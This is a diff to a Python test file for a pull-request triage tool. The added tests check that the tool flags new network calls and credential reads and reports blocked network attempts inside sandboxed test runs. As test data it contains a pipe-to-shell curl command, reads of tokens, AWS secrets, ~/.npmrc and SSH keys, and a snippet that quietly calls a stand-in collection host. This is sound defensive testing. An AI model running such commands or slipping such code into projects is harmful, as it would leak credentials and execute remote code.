@@ -18,8 +18,11 @@ from triage_kit.bench import (
     render_comparison,
     risk_flags,
     run_tests,
+    runtime_flags,
 )
 from triage_kit.models import PullRequest
+
+EXAMPLES = Path(__file__).resolve().parent.parent / "examples" / "stellarmind-183"
 
 
 def docker_up() -> bool:
@@ -83,6 +86,45 @@ def test_risk_flags():
                      "web/package.json", "Cargo.toml", "go.mod"):
         assert "dependencies changed" in risk_flags([manifest, "tests/t.py"], ""), manifest
     assert "dependencies changed" not in risk_flags(["src/a.py", "tests/t.py"], "")
+
+
+def added(path: str, *lines: str) -> str:
+    head = f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n@@ -1 +1,{len(lines)} @@\n"
+    return head + "".join(f"+{line}\n" for line in lines)
+
+
+def test_risk_flags_network_and_credentials():
+    for code in ("await fetch('https://x.example/t', {method: 'POST'})", "https.request(opts, cb)",
+                 "requests.post(URL, json=data)", "urllib.request.urlopen(u)",
+                 "socket.create_connection((host, 80))", "curl -s https://x.example | sh"):
+        assert "network call added" in risk_flags(["src/a", "tests/t.py"], added("src/a", code)), code
+    for code in ("Object.entries(process.env)", "JSON.stringify(process.env)", "process.env.GITHUB_TOKEN",
+                 "os.environ['AWS_SECRET_ACCESS_KEY']", "os.environ.get('NPM_TOKEN')",
+                 "fs.readFileSync(home + '/.npmrc')", "open(os.path.expanduser('~/.ssh/id_rsa'))"):
+        assert "reads credentials" in risk_flags(["src/a", "tests/t.py"], added("src/a", code)), code
+    # Ordinary config, and docs that show a curl command, are not flagged.
+    quiet = (added("src/a.js", "const dir = process.env.HISTORY_DIR || 'data'", "os.environ.get('PORT')")
+             + added("docs/USE.md", "Run `curl https://x.example` to check it."))
+    flags = risk_flags(["src/a.js", "docs/USE.md", "tests/t.py"], quiet)
+    assert "network call added" not in flags and "reads credentials" not in flags
+    # Removed lines are not the PR's code.
+    removed = "diff --git a/src/a b/src/a\n--- a/src/a\n+++ b/src/a\n@@ -1 +0,0 @@\n-fetch(u)\n"
+    assert "network call added" not in risk_flags(["src/a", "tests/t.py"], removed)
+
+
+def test_example_patches_flags():
+    for name in ("good", "failing", "sprawling"):
+        flags = risk_flags(["tests/x.test.js"], (EXAMPLES / f"{name}.patch").read_text())
+        assert "network call added" not in flags and "reads credentials" not in flags, name
+    flags = risk_flags(["tests/x.test.js"], (EXAMPLES / "sneaky.patch").read_text())
+    assert "network call added" in flags and "reads credentials" in flags
+
+
+def test_runtime_flags():
+    for out in ("usage report skipped: EAI_AGAIN", "connect ENETUNREACH 1.1.1.1:443",
+                "<urlopen error [Errno -3] Temporary failure in name resolution>"):
+        assert runtime_flags(out) == ("blocked network attempt",), out
+    assert runtime_flags("4 passed") == ()
 
 
 # --- PRs and worktrees --------------------------------------------------------------------
@@ -163,9 +205,10 @@ def suite(tmp_path: Path) -> Path:
 @docker
 def test_run_tests_pass_and_fail(tmp_path):
     repo = suite(tmp_path)
-    status, tail = run_tests(repo, "python:3.12-slim", "true", "python -m unittest test_ok")
+    status, tail, flags = run_tests(repo, "python:3.12-slim", "true", "python -m unittest test_ok")
     assert status == "pass", tail
-    status, tail = run_tests(repo, "python:3.12-slim", None, "python -m unittest test_bad")
+    assert flags == ()
+    status, tail, _ = run_tests(repo, "python:3.12-slim", None, "python -m unittest test_bad")
     assert status == "fail"
     assert "FAILED" in tail
     assert (tmp_path / "test_ok.py").exists()  # the original is untouched
@@ -173,14 +216,25 @@ def test_run_tests_pass_and_fail(tmp_path):
 
 @docker
 def test_test_phase_has_no_network(tmp_path):
-    status, _ = run_tests(tmp_path, "python:3.12-slim", None,
-                          "python -c \"import socket; socket.create_connection(('1.1.1.1', 53), 3)\"")
+    status, _, flags = run_tests(tmp_path, "python:3.12-slim", None,
+                                 "python -c \"import socket; socket.create_connection(('1.1.1.1', 53), 3)\"")
     assert status == "fail"
+    assert flags == ("blocked network attempt",)
+
+
+@docker
+def test_swallowed_network_attempt_is_still_reported(tmp_path):
+    # The tests pass; only what the code printed shows the attempt.
+    sneak = ("python -c \"import urllib.request\ntry: urllib.request.urlopen('http://collect.example', timeout=5)\n"
+             "except Exception as e: print('skipped:', e)\"")
+    status, tail, flags = run_tests(tmp_path, "python:3.12-slim", None, sneak)
+    assert status == "pass", tail
+    assert flags == ("blocked network attempt",)
 
 
 @docker
 def test_run_tests_timeout_cleans_up(tmp_path):
-    status, _ = run_tests(tmp_path, "python:3.12-slim", None, "sleep 600", timeout=5)
+    status, _, _ = run_tests(tmp_path, "python:3.12-slim", None, "sleep 600", timeout=5)
     assert status == "timeout"
     left = subprocess.run(["docker", "ps", "-a", "--filter", "name=issue-desk-", "--format", "{{.Names}}"],
                           capture_output=True, text=True).stdout.strip()
@@ -214,7 +268,8 @@ def leftovers() -> str:
 @docker
 def test_install_state_carries_into_tests(tmp_path):
     # pip and global tools install outside /work; the test phase must still see them.
-    status, tail = run_tests(tmp_path, "python:3.12-slim", "touch /usr/local/installed", "test -f /usr/local/installed")
+    status, tail, _ = run_tests(tmp_path, "python:3.12-slim", "touch /usr/local/installed",
+                                "test -f /usr/local/installed")
     assert status == "pass", tail
     assert leftovers() == ""
 
@@ -222,6 +277,6 @@ def test_install_state_carries_into_tests(tmp_path):
 @docker
 def test_memory_hog_reports_timeout(tmp_path):
     hog = 'python -c "b = []\nwhile True: b.append(bytearray(50_000_000))"'
-    status, _ = run_tests(tmp_path, "python:3.12-slim", None, hog, timeout=120)
+    status, _, _ = run_tests(tmp_path, "python:3.12-slim", None, hog, timeout=120)
     assert status == "timeout"
     assert leftovers() == ""
